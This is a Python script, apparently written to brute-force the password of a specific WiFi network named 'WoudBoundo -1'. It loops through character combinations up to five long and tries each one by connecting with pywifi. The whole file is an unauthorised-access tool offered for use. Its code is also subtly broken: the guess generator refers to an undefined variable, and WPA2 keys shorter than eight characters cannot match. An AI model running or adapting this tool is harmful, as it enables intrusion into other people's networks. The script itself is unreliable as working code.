import time
import pywifi
from pywifi import const

# Function to attempt WiFi connection
def try_connect(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Use the first WiFi interface

    iface.disconnect()
    time.sleep(1)

    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)

        iface.connect(tmp_profile)
        time.sleep(5)  # Wait for connection attempt

        if iface.status() == const.IFACE_CONNECTED:
            return True
        else:
            iface.disconnect()
            return False
    else:
        return False

# WiFi details
ssid = "WoudBoundo -1"
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?/`~ '

start = time.time()
found = False
password_found = ""

# Generate guesses up to length 5
for val in range(1, 6):  # Start from 1 to avoid empty string
    a = [i for i in chars]
    for y in range(val - 1):
        a = [x + i for i in chars for a in a ]
    for guess in a:
        print(f"Trying password: {guess}")
        if try_connect(ssid, guess):
            password_found = guess
            found = True
            break
    if found:
        break

end = time.time()
clock = str(end - start)

if found:
    print("WiFi password found: " + password_found)
    print("Time taken: " + clock)
else:
    print("Password not found in the generated guesses.")
    print("Time taken: " + clock)
